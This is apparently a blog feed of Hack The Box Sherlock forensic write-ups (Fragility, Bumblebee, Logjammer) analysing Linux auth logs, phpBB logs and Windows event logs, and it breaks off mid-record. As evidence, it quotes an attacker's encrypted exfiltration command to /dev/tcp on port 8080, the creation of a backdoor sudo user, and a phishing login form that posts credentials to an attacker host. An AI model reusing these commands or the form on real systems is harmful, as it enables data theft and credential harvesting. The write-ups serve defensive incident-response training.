/etc/vmware-tools/scripts/vmware/network + . /etc/vmware-tools/scripts/vmware/../../statechange.subr + main poweron-vm + exitcode=0 + activelist=/var/run/vmware-active-nics + rm -f /var/run/vmware-active-nics + return 0 + date + echo sat 13 apr 2024 11:19:41 pm pdt : finished \u0026#39;/etc/vmware-tools/scripts/vmware/network poweron-vm\u0026#39; sat 13 apr 2024 11:19:41 pm pdt : finished \u0026#39;/etc/vmware-tools/scripts/vmware/network poweron-vm\u0026#39; we were also able to find the previous timezone that was set to pdt. using epoch converter i was able to find the pdt timezone\u0026rsquo;s offset which were -07\nnext up we need to calculate the dwell time for nginx user creation to ssh logout session.\n$ cat auth.log | grep -i nginx apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/group: name=nginx, gid=1002 apr 14 08:00:13 ubuntu groupadd[13358]: group added to /etc/gshadow: name=nginx apr 14 08:00:13 ubuntu groupadd[13358]: new group: name=nginx, gid=1002 apr 14 08:00:13 ubuntu useradd[13364]: new user: name=nginx, uid=1002, gid=1002, home=/var/www/, shell=/bin/bash, from=none apr 14 08:00:13 ubuntu usermod[13376]: change user \u0026#39;nginx\u0026#39; password apr 14 08:00:13 ubuntu chfn[13383]: changed user \u0026#39;nginx\u0026#39; information apr 14 08:00:13 ubuntu chpasswd[13394]: pam_unix(chpasswd:chauthtok): password changed for nginx apr 14 08:00:13 ubuntu usermod[13397]: add \u0026#39;nginx\u0026#39; to group \u0026#39;sudo\u0026#39; apr 14 08:00:13 ubuntu usermod[13397]: add \u0026#39;nginx\u0026#39; to shadow group \u0026#39;sudo\u0026#39; apr 14 08:00:21 ubuntu sshd[13461]: accepted publickey for nginx from 192.168.222.130 port 43302 ssh2: rsa sha256:zrdvnxnrpj37hdm5kkrvqbklvc2pffl3av8w1jb6qoe apr 14 08:00:21 ubuntu sshd[13461]: pam_unix(sshd:session): session opened for user nginx by (uid=0) apr 14 08:00:21 ubuntu systemd-logind[673]: new session 7 of user nginx. apr 14 08:00:22 ubuntu systemd: pam_unix(systemd-user:session): session opened for user nginx by (uid=0) apr 14 08:00:54 ubuntu sudo: nginx : tty=pts/2 ; pwd=/opt/splunk/bin/scripts ; user=root ; command=/usr/bin/rm -rf search.sh apr 14 08:00:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0) apr 14 08:00:59 ubuntu sudo: nginx : tty=pts/2 ; pwd=/opt/splunk/bin/scripts ; user=root ; command=/usr/bin/su apr 14 08:00:59 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0) apr 14 08:00:59 ubuntu su: (to root) nginx on pts/2 apr 14 08:00:59 ubuntu su: pam_unix(su:session): session opened for user root by nginx(uid=0) apr 14 08:02:21 ubuntu sudo: nginx : tty=pts/2 ; pwd=/var/www ; user=root ; command=/usr/bin/mv /home/johnnycage/documents/important.pdf . apr 14 08:02:21 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0) apr 14 08:02:54 ubuntu sudo: nginx : tty=pts/2 ; pwd=/var/www ; user=root ; command=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -k 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip apr 14 08:02:54 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0) apr 14 08:03:01 ubuntu sudo: nginx : tty=pts/2 ; pwd=/var/www ; user=root ; command=/usr/bin/rm -rf data.zip important.pdf apr 14 08:03:01 ubuntu sudo: pam_unix(sudo:session): session opened for user root by nginx(uid=0) apr 14 08:03:08 ubuntu sshd[13702]: disconnected from user nginx 192.168.222.130 port 43302 apr 14 08:03:08 ubuntu sshd[13461]: pam_unix(sshd:session): session closed for user nginx the useradd command was issued on apr 14 08:00:13 and the session for nginx user was closed on apr 14 08:03:08. i used the [[time]] resource\u0026rsquo;s add subtract time website to calculate the time difference. it was 2 minutes and 55 seconds.\nthen to find the password of the nginx i copied the following snippet from the malicious xslt file.\n$ access=$(echo mzlhnmjizty0ntyzlty3mdktotnhnc1howyzltjjztc4mjhm | base64 -d | rev);echo \u0026#34;nginx:$access\u0026#34;; nginx:f8287ec2-3f9a-4a39-9076-36546ebb6a93 the password for the nginx user is stored inside the $access variable.\ntask 7 was really hard for me. i first read the attacker .bash_history file and fond the following commands the ta ran.\nwhoami cd /opt/splunk/bin/scripts/ ls sudo rm -rf search.sh ls sudo su ls cd /home/johnnycage/ tree cd ~ ls sudo mv /home/johnnycage/documents/important.pdf . ls zip data.zip * ls sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 \u0026lt;\u0026lt;\u0026lt; $(uname -r | md5sum)) -k $(cut -c 1-64 \u0026lt;\u0026lt;\u0026lt; $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic \u0026gt; /dev/tcp/192.168.222.130/8080 sudo rm -rf * ls exit at a first glance it\u0026rsquo;s a clever trick to hide the used key and iv for the aes-256-cbc algorithm used to encrypt the exfiltrated file. there\u0026rsquo;s a lot of randomness to both the key and iv.\nbut examining the auth.log we found the plain command that was ran by the nginx user.\n$ cat auth.log | grep -i .zip apr 14 08:02:54 ubuntu sudo: nginx : tty=pts/2 ; pwd=/var/www ; user=root ; command=/usr/bin/openssl enc -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -k 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip apr 14 08:03:01 ubuntu sudo: nginx : tty=pts/2 ; pwd=/var/www ; user=root ; command=/usr/bin/rm -rf data.zip important.pdf we found the key and the iv for the data.zip file. but, unfortunately the ta deleted the files both data.zip and important.pdf. i scoured the whole os directories and files to find the file but to my ignorance i completely ignored the capture.pcapng file.\nso, i opened up wireshark again and searched for the port 8080. i followed the tcp stream and exported the data in ascii format. but, i couldn\u0026rsquo;t decrypt the data.zip. something was not right as i completely ignored another hint from the commands ran by the ta. before, exfiltrating the data the did some encoding to the data.zip file.\nsudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 \u0026lt;\u0026lt;\u0026lt; $(uname -r | md5sum)) -k $(cut -c 1-64 \u0026lt;\u0026lt;\u0026lt; $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic \u0026gt; /dev/tcp/192.168.222.130/8080 they first converted the encrypted data.zip file to base64 and then used dd conv=ebcdic to convert the codec from ascii to ebcdic.\nthis time i exported the whole tcp stream in ebcdic which reversed the ebcdic conversion back to ascii. we can see the content is now in base64 when i selected show data as ebcdic.\nthen, decoded the base64 back to encrypted data.zip\n$ base64 -di data \u0026gt; data.zip now we got the encrypted data.zip file. we can now successfully try to decrypt it.\n$ openssl enc -d -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -k 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -in data.zip -out data_dec.zip $ unzip data_dec.zip archive: data_dec.zip inflating: important.pdf found, the important.pdf. and found the answer to task 7. for the task 8, we can easily find the credential using wireshark. summary in this sherlock, the ta exploited the splunk server to run a malicious bash script embedded in xslt file. the bash script contained a persistence mechanism to add a new user onto the system and to the sudo group. the ta also injected a public key to the newly created user nginx\u0026rsquo;s .ssh/authorized_keys to access the backdoor account. after that the ta logged in as nginx and elevated their privileges to root using su. then the ta moved an important file from johnycage\u0026rsquo;s documents directory and encrypted the file and exfiltrated the file to his own c2 server 192.168.222.130:8080.\n","title":"HTB Sherlock Fragility"},{"date":"2024-06-15","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/bumblebee/","summary":"Bumblebee (DFIR) Scenario An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.","tags":["access","dfir","htb","linux","log","phishing","phpbb","sherlock","sqlite3"],"text":"bumblebee (dfir) scenario an external contractor has accessed the internal forum here at forela via the guest wi-fi, and they appear to have stolen credentials for the administrative user! we have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.\nartifacts artifact md5 hash password bumblebee.zip ba06e26779ead4b6299b6a188d11fc02 hackthebkue incident.tgz 1b301c2fb2a1232758aca31588506edf n/a tools used sqlite browser - for phpbb.sqlite3 database analysis. linux terminal - for access.log analysis. forensic analysis analyzing sqlite3 database\nthe contractor\u0026rsquo;s user information are listed below. the contractor\u0026rsquo;s post information for the forum are listed below. post contents malicious part\n\u0026lt;--snip--\u0026gt; \u0026lt;div id=\u0026#34;page-body\u0026#34; class=\u0026#34;page-body\u0026#34; role=\u0026#34;main\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;panel\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;inner\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;session timeout\u0026lt;/h3\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;br /\u0026gt; \u0026lt;p\u0026gt;your session token has timed out in order to proceed you must login again.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;form action=\u0026#34;http://10.10.0.78/update.php\u0026#34; method=\u0026#34;post\u0026#34; id=\u0026#34;login\u0026#34; data-focus=\u0026#34;username\u0026#34; target=\u0026#34;hiddenframe\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;panel\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;inner\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;login-title\u0026#34;\u0026gt;login\u0026lt;/h2\u0026gt; \u0026lt;fieldset class=\u0026#34;fields1\u0026#34;\u0026gt; \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt;\u0026lt;label for=\u0026#34;username\u0026#34;\u0026gt;username:\u0026lt;/label\u0026gt;\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; tabindex=\u0026#34;1\u0026#34; name=\u0026#34;username\u0026#34; id=\u0026#34;username\u0026#34; size=\u0026#34;25\u0026#34; value=\u0026#34;\u0026#34; class=\u0026#34;inputbox autowidth\u0026#34;\u0026gt;\u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt;\u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;password:\u0026lt;/label\u0026gt;\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;\u0026lt;input type=\u0026#34;password\u0026#34; tabindex=\u0026#34;2\u0026#34; id=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; size=\u0026#34;25\u0026#34; class=\u0026#34;inputbox autowidth\u0026#34; autocomplete=\u0026#34;off\u0026#34;\u0026gt;\u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; \u0026lt;dl\u0026gt; \u0026lt;dd\u0026gt;\u0026lt;label for=\u0026#34;autologin\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;checkbox\u0026#34; name=\u0026#34;autologin\u0026#34; id=\u0026#34;autologin\u0026#34; tabindex=\u0026#34;4\u0026#34;\u0026gt;remember me\u0026lt;/label\u0026gt;\u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;\u0026lt;label for=\u0026#34;viewonline\u0026#34;\u0026gt;\u0026lt;input type=\u0026#34;checkbox\u0026#34; name=\u0026#34;viewonline\u0026#34; id=\u0026#34;viewonline\u0026#34; tabindex=\u0026#34;5\u0026#34;\u0026gt;hide my online status this session\u0026lt;/label\u0026gt;\u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt;\u0026amp;nbsp;\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;login\u0026#34; tabindex=\u0026#34;6\u0026#34; value=\u0026#34;login\u0026#34; class=\u0026#34;button1\u0026#34; onclick=\u0026#34;sethidden()\u0026#34;\u0026gt;\u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt; \u0026lt;/fieldset class=\u0026#34;fields1\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; at this point we have identified the malicious ip 10.10.0.78, and was used to access the forum as well as staging a credential stealer namely update.php.\nbrowsing the phpbb_log table we found additional information when the contractor logged in as administrator. the real administrator\u0026rsquo;s ip was 10.255.254.2. upon investigating the access.log artifact we can verify their information like user-agent, which urls were visited to get a sense of baseline activity which are normal for an administrator user.\nthen we can use those information against the threat actor to accurately paint a picture of the malicious activities that was done.\nanalyzing access.log\nan access.log file can have a vast volume of data it is recommended to use splunk or elasticsearch or any kind of siem tool to quickly find and triage information. but, in our case we have relatively small amount of data and we can use basic linux commands to filter and search for the information we are looking for.\nfiltering the access.log file is very helpful to find the actual data we are looking for. for example, we don\u0026rsquo;t need the data when a page loads and request are made to load css, images, assets to render the ui.\nwe can easily filter those types of requests using egrep. the command for filtering assets related data is given below:\ncat access.log | egrep -v \u0026#34;/(assets|style|images)\u0026#34; here -v returns everything except the matching pattern.\nlet\u0026rsquo;s search for the legit administrator\u0026rsquo;s user agent information.\n$ cat access.log | egrep -v \u0026#34;/(assets|style|images)\u0026#34; | egrep -i 10.255.254.2 | head -n1 10.255.254.2 - - [25/apr/2023:12:08:42 +0100] \u0026#34;get /adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6\u0026amp;i=12 http/1.1\u0026#34; 403 9412 \u0026#34;http://10.10.0.27/adm/index.php?sid=ac1490e6c806ac0403c6c116c1d15fa6\u0026amp;i=1\u0026#34; \u0026#34;mozilla/5.0 (macintosh; intel mac os x 10_15_7) applewebkit/537.36 (khtml, like gecko) chrome/112.0.0.0 safari/537.36\u0026#34; let\u0026rsquo;s search for the adversary\u0026rsquo;s user agent information.\n$ cat access.log | egrep -v \u0026#34;/(assets|style|images)\u0026#34; | egrep -i 10.10.0.78 | head -n1 10.10.0.78 - - [25/apr/2023:12:07:39 +0100] \u0026#34;get / http/1.1\u0026#34; 200 4205 \u0026#34;-\u0026#34; \u0026#34;mozilla/5.0 (windows nt 10.0; win64; x64; rv:106.0) gecko/20100101 firefox/106.0\u0026#34; the contractor added himself to the administrator group.\n$ cat access.log | egrep -v \u0026#34;/(assets|style|images)\u0026#34; | egrep -i 10.10.0.78 | grep adm | grep acp_groups | grep post 10.10.0.78 - - [26/apr/2023:11:53:51 +0100] \u0026#34;post /adm/index.php?i=acp_groups\u0026amp;sid=eca30c1b75dc3eed1720423aa1ff9577\u0026amp;icat=12\u0026amp;mode=manage\u0026amp;g=5 http/1.1\u0026#34; 200 2623 \u0026#34;http://10.10.0.27/adm/index.php?i=acp_groups\u0026amp;sid=eca30c1b75dc3eed1720423aa1ff9577\u0026amp;icat=12\u0026amp;mode=manage\u0026amp;action=list\u0026amp;g=5\u0026#34; \u0026#34;mozilla/5.0 (windows nt 10.0; win64; x64; rv:109.0) gecko/20100101 firefox/112.0\u0026#34; the contractor also sent two requests to backup the database.\n$ cat access.log | egrep -v \u0026#34;/(assets|style|images)\u0026#34; | egrep -i 10.10.0.78 | grep adm | grep action=download 10.10.0.78 - - [26/apr/2023:11:54:22 +0100] \u0026#34;post /adm/index.php?i=acp_database\u0026amp;sid=eca30c1b75dc3eed1720423aa1ff9577\u0026amp;mode=backup\u0026amp;action=download http/1.1\u0026#34; 200 2463 \u0026#34;http://10.10.0.27/adm/index.php?sid=eca30c1b75dc3eed1720423aa1ff9577\u0026amp;i=acp_database\u0026amp;mode=backup\u0026#34; \u0026#34;mozilla/5.0 (windows nt 10.0; win64; x64; rv:109.0) gecko/20100101 firefox/112.0\u0026#34; 10.10.0.78 - - [26/apr/2023:11:54:24 +0100] \u0026#34;get /adm/index.php?i=acp_database\u0026amp;sid=eca30c1b75dc3eed1720423aa1ff9577\u0026amp;mode=backup http/1.1\u0026#34; 200 3771 \u0026#34;http://10.10.0.27/adm/index.php?i=acp_database\u0026amp;sid=eca30c1b75dc3eed1720423aa1ff9577\u0026amp;mode=backup\u0026amp;action=download\u0026#34; \u0026#34;mozilla/5.0 (windows nt 10.0; win64; x64; rv:109.0) gecko/20100101 firefox/112.0\u0026#34; 10.10.0.78 - - [26/apr/2023:11:54:30 +0100] \u0026#34;post /adm/index.php?i=acp_database\u0026amp;sid=eca30c1b75dc3eed1720423aa1ff9577\u0026amp;mode=backup\u0026amp;action=download http/1.1\u0026#34; 200 2474 \u0026#34;http://10.10.0.27/adm/index.php?i=acp_database\u0026amp;sid=eca30c1b75dc3eed1720423aa1ff9577\u0026amp;mode=backup\u0026#34; \u0026#34;mozilla/5.0 (windows nt 10.0; win64; x64; rv:109.0) gecko/20100101 firefox/112.0\u0026#34; 10.10.0.78 - - [26/apr/2023:11:56:28 +0100] \u0026#34;get /adm/index.php?i=acp_database\u0026amp;sid=eca30c1b75dc3eed1720423aa1ff9577\u0026amp;mode=backup http/1.1\u0026#34; 200 3770 \u0026#34;http://10.10.0.27/adm/index.php?i=acp_database\u0026amp;sid=eca30c1b75dc3eed1720423aa1ff9577\u0026amp;mode=backup\u0026amp;action=download\u0026#34; \u0026#34;mozilla/5.0 (windows nt 10.0; win64; x64; rv:109.0) gecko/20100101 firefox/112.0\u0026#34; and finally they downloaded the database backup.\n$ cat access.log | egrep -v \u0026#34;/(assets|style|images)\u0026#34; | egrep -i 10.10.0.78 | grep .sql 10.10.0.78 - - [26/apr/2023:12:01:38 +0100] \u0026#34;get /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz http/1.1\u0026#34; 200 34707 \u0026#34;-\u0026#34; \u0026#34;mozilla/5.0 (windows nt 10.0; win64; x64; rv:109.0) gecko/20100101 firefox/112.0\u0026#34; the database backup file size was 34707 bytes (34.7 kb) in size.\nsummary the contractor used his account to stage a phishing page in the internal forum of forela. then he stole the administrator\u0026rsquo;s credential using the phishing page and exfiltrated the data using a credential stealer (httx://10.10.0.78/update.php) hosted on the ip 10.10.0.78. then, they used the stolen administrator credential created an account (apoole) for persistence. then they backed up and downloaded the database.\n","title":"HTB Sherlock Bumblebee"},{"date":"2024-06-13","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/logjammer/","summary":"LoLogjammer - DFIR Scenario You have been presented with the opportunity to work as a junior DFIR consultant for a big consultancy. However, they have provided a technical assessment for you to complete.","tags":["dfir","event","evtx","evtxecmd","firewall-event","htb","log","powershell-event","python-evtx","security-event","sherlock","system-event","windows","windows-defender-event","zimmerman-tools"],"text":"lologjammer - dfir scenario you have been presented with the opportunity to work as a junior dfir consultant for a big consultancy. however, they have provided a technical assessment for you to complete. the consultancy forela-security would like to gauge your windows event log analysis knowledge. we believe the cyberjunkie user logged in to his computer and may have taken malicious actions. please analyze the given event logs and report back.\nartifacts name md5 hash password logjammer.zip 2ba794c406aee485186a959c840125af hacktheblue event-logs/powershell-operational.evtx 6739802c74adc7bf6432dfcec853397c n/a event-logs/security.evtx 5b75f867d2107d04721ccaeea7914cfd n/a event-logs/system.evtx 34b0d7a505c880a8ae78405d581b2b1a n/a event-logs/windows defender-operational.evtx a2f06faad866ac054705643b0e2c2364 n/a event-logs/windows firewall-firewall.evtx 7ff34616822baa259a8179ed3677173a n/a tools evtx_dump: for dumping the evtx file. jq: for querying the dumped json files. forensic analysis let\u0026rsquo;s dump the evtx file to json, after that we can determine if we should use any siem tool for analysis for the linux command line will be sufficient based on the volume of the data.\nto dump the evtx file to json we can use evtx-dump. here are some resources for finding windows event log\u0026rsquo;s event ids, event names, event description, etc. - [[windows event logs]].\ndump .evtx to jsonl\n$ evtx_dump -f \u0026#39;windows firewall-firewall.json\u0026#39; -o jsonl windows\\ firewall-firewall.evtx analyze the logs using event id and search the converted json files using jq. to make this operation easy we can concatenate all the converted json files to a single log file.\nlooking for a user with username cyberjunkie for a user logon event (4624) would be like the following:\n$ cat all_events.json | jq \u0026#39;select(.event.system.eventid==4624 and .event.eventdata.targetusername==\u0026#34;cyberjunkie\u0026#34;)\u0026#39; -c | wc -l 4 the user cyberjunkie logged in 4 times to the workstation that is compromised.\nthe user also modified the firewall setting and added a firewall rule metasploit c2 bypass to facilitate his c2 server communication. here, event id 2004 for event source microsoft-windows-windows firewall with advanced security is logged when a rule has been added to the windows firewall exception list.\n$ cat all_events.json | jq \u0026#39;select(.event.system.eventid==2004 and .event.eventdata.modifyinguser==\u0026#34;s-1-5-21-3393683511-3463148672-371912004-1001\u0026#34;) .event.eventdata.rulename\u0026#39; \u0026#34;file and printer sharing (llmnr-udp-out)\u0026#34; \u0026#34;file and printer sharing (llmnr-udp-in)\u0026#34; \u0026#34;file and printer sharing (echo request - icmpv6-out)\u0026#34; \u0026#34;file and printer sharing (echo request - icmpv6-in)\u0026#34; \u0026#34;file and printer sharing (echo request - icmpv4-out)\u0026#34; \u0026#34;file and printer sharing (echo request - icmpv4-in)\u0026#34; \u0026#34;file and printer sharing (spooler service - rpc-epmap)\u0026#34; \u0026#34;file and printer sharing (spooler service - rpc)\u0026#34; \u0026#34;file and printer sharing (nb-datagram-out)\u0026#34; \u0026#34;file and printer sharing (nb-datagram-in)\u0026#34; \u0026#34;file and printer sharing (nb-name-out)\u0026#34; \u0026#34;file and printer sharing (nb-name-in)\u0026#34; \u0026#34;file and printer sharing (smb-out)\u0026#34; \u0026#34;file and printer sharing (smb-in)\u0026#34; \u0026#34;file and printer sharing (nb-session-out)\u0026#34; \u0026#34;file and printer sharing (nb-session-in)\u0026#34; \u0026#34;network discovery (pub wsd-out)\u0026#34; \u0026#34;network discovery (pub-wsd-in)\u0026#34; \u0026#34;network discovery (llmnr-udp-out)\u0026#34; \u0026#34;network discovery (llmnr-udp-in)\u0026#34; \u0026#34;network discovery (wsd-out)\u0026#34; \u0026#34;network discovery (wsd-in)\u0026#34; \u0026#34;network discovery (wsd-in)\u0026#34; \u0026#34;network discovery (upnphost-out)\u0026#34; \u0026#34;network discovery (ssdp-out)\u0026#34; \u0026#34;network discovery (ssdp-in)\u0026#34; \u0026#34;firefox (c:\\\\program files\\\\mozilla firefox)\u0026#34; \u0026#34;firefox (c:\\\\program files\\\\mozilla firefox)\u0026#34; \u0026#34;metasploit c2 bypass\u0026#34; here\u0026rsquo;s the details of the malicious rule named added to the exception list.\n$ cat all_events.json | jq \u0026#39;select(.event.system.eventid==2004 and .event.eventdata.modifyinguser==\u0026#34;s-1-5-21-3393683511-3463148672-371912004-1001\u0026#34; and .event.eventdata.rulename==\u0026#34;metasploit c2 bypass\u0026#34;)\u0026#39; { \u0026#34;event\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;xmlns\u0026#34;: \u0026#34;http://schemas.microsoft.com/win/2004/08/events/event\u0026#34; }, \u0026#34;eventdata\u0026#34;: { \u0026#34;action\u0026#34;: 3, \u0026#34;active\u0026#34;: 1, \u0026#34;applicationpath\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;direction\u0026#34;: 2, \u0026#34;edgetraversal\u0026#34;: 0, \u0026#34;embeddedcontext\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;flags\u0026#34;: 1, \u0026#34;localaddresses\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;localonlymapped\u0026#34;: 0, \u0026#34;localports\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;loosesourcemapped\u0026#34;: 0, \u0026#34;modifyingapplication\u0026#34;: \u0026#34;c:\\\\windows\\\\system32\\\\mmc.exe\u0026#34;, \u0026#34;modifyinguser\u0026#34;: \u0026#34;s-1-5-21-3393683511-3463148672-371912004-1001\u0026#34;, \u0026#34;origin\u0026#34;: 1, \u0026#34;profiles\u0026#34;: 2147483647, \u0026#34;protocol\u0026#34;: 6, \u0026#34;remoteaddresses\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;remotemachineauthorizationlist\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;remoteports\u0026#34;: \u0026#34;4444\u0026#34;, \u0026#34;remoteuserauthorizationlist\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;ruleid\u0026#34;: \u0026#34;{11309293-fb68-4969-93f9-7f75a9032570}\u0026#34;, \u0026#34;rulename\u0026#34;: \u0026#34;metasploit c2 bypass\u0026#34;, \u0026#34;rulestatus\u0026#34;: 65536, \u0026#34;schemaversion\u0026#34;: 542, \u0026#34;securityoptions\u0026#34;: 0, \u0026#34;servicename\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;system\u0026#34;: { \u0026#34;channel\u0026#34;: \u0026#34;microsoft-windows-windows firewall with advanced security/firewall\u0026#34;, \u0026#34;computer\u0026#34;: \u0026#34;desktop-887gk2l\u0026#34;, \u0026#34;correlation\u0026#34;: null, \u0026#34;eventid\u0026#34;: 2004, \u0026#34;eventrecordid\u0026#34;: 1120, \u0026#34;execution\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;processid\u0026#34;: 2384, \u0026#34;threadid\u0026#34;: 2868 } }, \u0026#34;keywords\u0026#34;: \u0026#34;0x8000020000000000\u0026#34;, \u0026#34;level\u0026#34;: 4, \u0026#34;opcode\u0026#34;: 0, \u0026#34;provider\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;guid\u0026#34;: \u0026#34;d1bc9aff-2abf-4d71-9146-ecb2a986eb85\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;microsoft-windows-windows firewall with advanced security\u0026#34; } }, \u0026#34;security\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;userid\u0026#34;: \u0026#34;s-1-5-19\u0026#34; } }, \u0026#34;task\u0026#34;: 0, \u0026#34;timecreated\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;systemtime\u0026#34;: \u0026#34;2023-03-27t14:44:43.415702z\u0026#34; } }, \u0026#34;version\u0026#34;: 0 } } } the firewall rule\u0026rsquo;s direction was set to \u0026ldquo;2\u0026rdquo; which means \u0026ldquo;outbound\u0026rdquo;. so, i think \u0026ldquo;1\u0026rdquo; means \u0026ldquo;inbound\u0026rdquo;? unable to find documentation regarding the integer values.\nwindows policy change event id is 4719:\n$ cat all_events.json | jq \u0026#39;select(.event.system.eventid==4719)\u0026#39; { \u0026#34;event\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;xmlns\u0026#34;: \u0026#34;http://schemas.microsoft.com/win/2004/08/events/event\u0026#34; }, \u0026#34;eventdata\u0026#34;: { \u0026#34;auditpolicychanges\u0026#34;: \u0026#34;%%8449\u0026#34;, \u0026#34;categoryid\u0026#34;: \u0026#34;%%8274\u0026#34;, \u0026#34;subcategoryguid\u0026#34;: \u0026#34;0cce9227-69ae-11d9-bed3-505054503030\u0026#34;, \u0026#34;subcategoryid\u0026#34;: \u0026#34;%%12804\u0026#34;, \u0026#34;subjectdomainname\u0026#34;: \u0026#34;workgroup\u0026#34;, \u0026#34;subjectlogonid\u0026#34;: \u0026#34;0x3e7\u0026#34;, \u0026#34;subjectusername\u0026#34;: \u0026#34;desktop-887gk2l$\u0026#34;, \u0026#34;subjectusersid\u0026#34;: \u0026#34;s-1-5-18\u0026#34; }, \u0026#34;system\u0026#34;: { \u0026#34;channel\u0026#34;: \u0026#34;security\u0026#34;, \u0026#34;computer\u0026#34;: \u0026#34;desktop-887gk2l\u0026#34;, \u0026#34;correlation\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;activityid\u0026#34;: \u0026#34;986a053f-60b9-0002-5b05-6a98b960d901\u0026#34; } }, \u0026#34;eventid\u0026#34;: 4719, \u0026#34;eventrecordid\u0026#34;: 13102, \u0026#34;execution\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;processid\u0026#34;: 780, \u0026#34;threadid\u0026#34;: 1488 } }, \u0026#34;keywords\u0026#34;: \u0026#34;0x8020000000000000\u0026#34;, \u0026#34;level\u0026#34;: 0, \u0026#34;opcode\u0026#34;: 0, \u0026#34;provider\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;guid\u0026#34;: \u0026#34;54849625-5478-4994-a5ba-3e3b0328c30d\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;microsoft-windows-security-auditing\u0026#34; } }, \u0026#34;security\u0026#34;: null, \u0026#34;task\u0026#34;: 13568, \u0026#34;timecreated\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;systemtime\u0026#34;: \u0026#34;2023-03-27t14:50:03.721835z\u0026#34; } }, \u0026#34;version\u0026#34;: 0 } } } searching the sub category\u0026rsquo;s guid yielded the result other object access events.\nfinding scheduled task creation events by the user cyberjunkie\n$ cat all_events.json | jq \u0026#39;select(.event.system.eventid==4698 and .event.eventdata.subjectusername==\u0026#34;cyberjunkie\u0026#34;)\u0026#39; { \u0026#34;event\u0026#34;: { \u0026#34;#attributes\u0026#34;: { \u0026#34;xmlns\u0026#34;: \u0026#34;http://schemas.microsoft.com/win/2004/08/events/event\u0026#34; }, \u0026#34;eventdata\u0026#34;: { \u0026#34;clientprocessid\u0026#34;: 9320, \u0026#34;clientprocessstartkey\u0026#34;: 4222124650660162, \u0026#34;fqdn\u0026#34;: \u0026#34;desktop-887gk2l\u0026#34;, \u0026#34;parentprocessid\u0026#34;: 6112, \u0026#34;rpccallclientlocality\u0026#34;: 0, \u0026#34;subjectdomainname\u0026#34;: \u0026#34;desktop-887gk2l\u0026#34;, \u0026#34;subjectlogonid\u0026#34;: \u0026#34;0x25f28\u0026#34;, \u0026#34;subjectusername\u0026#34;: 